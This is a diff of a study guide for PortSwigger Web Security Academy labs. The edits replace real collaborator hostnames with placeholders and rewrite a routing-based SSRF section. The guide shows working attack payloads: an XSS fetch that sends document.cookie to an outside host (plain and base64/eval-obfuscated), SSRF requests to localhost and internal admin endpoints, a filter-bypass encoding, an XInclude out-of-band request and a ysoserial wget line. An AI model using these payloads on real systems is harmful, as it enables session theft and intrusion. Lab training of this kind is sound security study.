@@ -299,7 +299,7 @@ https://TARGET.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransfo
 [secjuice: Bypass XSS filters using JavaScript global variables](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/)  
   
 ```JavaScript
-fetch("https://Collaborator.oastify.com/?c=" + btoa(document['cookie']))
+fetch("https://COLLABORATOR.NET/?c=" + btoa(document['cookie']))
 ```
 >Base64 encode the payload.  
 
@@ -335,13 +335,13 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
 >Decode above payload from url encoding, is the following:  
 
 ```html
-https://TARGET.web-security-academy.net/?SearchTerm="+eval(atob("ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//  
+https://TARGET.net/?SearchTerm="+eval(atob("ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//  
 ```  
 
 >Decode part of payload above that is base64 encoded to the following:  
 
 ```html
-https://TARGET.web-security-academy.net/?SearchTerm="+eval(atob("fetch("https://839cktu7uogedm6a1kjuy3outlzcn2br.oastify.com/?c=" + btoa(document['cookie']))"))}//  
+https://TARGET.net/?SearchTerm="+eval(atob("fetch("https://COLLABORATOR.NET/?c=" + btoa(document['cookie']))"))}//  
 ```  
   
 #### URL & Base64 encoders and decoders  
@@ -499,7 +499,7 @@ X-Forwarded-Server: EXPLOIT.net
 
 ### HOST Connection State  
 
->Target is vulnerable to routing-based SSRF via the Host header. Sending grouped request in sequence using **single connection** and setting the connection header to **keep-alive**, bypass host header validation and enable SSRF exploit of local server.  
+>Target is vulnerable to **routing-based SSRF** via the Host header. Sending grouped request in sequence using **single connection** and setting the connection header to **keep-alive**, bypass host header validation and enable SSRF exploit of local server.  
 
 ```html
 GET /intranet/service HTTP/1.1
@@ -1291,6 +1291,8 @@ CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
 stockApi=http://localhost:6566/admin  
 
 http://127.1:6566/admin  
+
+Host: localhost
 ```  
 
 >Double URL encode characters in URL such as to **Obfuscate** the "a" by double-URL encoding it to ```%2561```, resulting in the bypass of blacklist filter.  
@@ -1361,39 +1363,43 @@ Content-Length: 206
 ![xxe-ssrf-localhost.png](images/xxe-ssrf-localhost.png)  
 
 [PortSwigger Lab: Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)  
+  
+### HOST Routing-based SSRF  
 
+>***Identify*** routing-based SSRF by altering the **host** header on request and observe the response. Routing-based SSRF via the Host header allow insecure access to a localhost intranet.  
 
-### SSRF HOST header routing  
-
->Routing-based SSRF via the Host header allow insecure access to a localhost intranet.  
-
-```html
-GET /service/intranet?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&readfile=/home/carlos/secret HTTP/1.1
-Host: localhost
+```
+GET / HTTP/1.1
+Host: 192.168.0.§0§
 ```  
-
->**Note:** Convert the GET request to POST.  
-
+  
 ![Routing-based SSRF](images/Routing-based-SSRF.png)  
 
+>**Note:** Once access gained access to internal server admin portal, the form require POST request, so we convert the GET request to POST as below.  
+
 ```html
-POST / HTTP/1.1
-Host: Collaborator.com
-Cookie: _lab=46%7cMCwCFBucXjC6hvd9WC4%2fwP3%2fkmpxu8mhAhR%2f9lrAED4p89w%2bSBi%2fujGmrnwZhjZyG%2fmQebBgi4naIZO%2flg2daYidh0KoLFjVIEV1DKMwigDLRyL4BspAm4Kiz4iRmXJYyTpvojI18biLNQEbid7G4fT6SvZuUjONK2CLqa%2bc8VqLQcU%3d; session=GvdpmebBL2eNQZMJjJmSh4ZU8QrTDVDq
-Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
+POST /admin/delete HTTP/1.1
+Host: 192.168.0.135
+Cookie: session=TmaxWQzsf7jfkn5KyT9V6GmeIV1lV75E
+Sec-Ch-Ua: "Not A(Brand";v="24", "Chromium";v="110"
 Sec-Ch-Ua-Mobile: ?0
 Sec-Ch-Ua-Platform: "Linux"
 Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://TARGET.web-security-academy.net/
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Connection: close
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 0
-```  
+Content-Length: 53
 
->***Identified*** SSRF with the help from collaborator as remote server, and this can allow also access to localhost, by changing the **HOST** header.  
+csrf=ftU8wSm4rqdQ2iuSZUwSGmDnLidhYjUg&username=carlos
+```  
 
 [PortSwigger Lab: Routing-based SSRF](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf)  
 
@@ -1763,7 +1769,7 @@ java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collabor
 >Out of band XInclude request, need hosted DTD to read local file.  
 
 ```xml
-<hqt xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://vfe7mddka77io3rz2xjvvbum5db9zzn0br1er2g.oastify.com/foo"/></hqt>
+<hqt xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://COLLABORATOR.NET/foo"/></hqt>
 ```  
 
 [PortSwigger Lab: Discovering vulnerabilities quickly with targeted scanning](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning)  
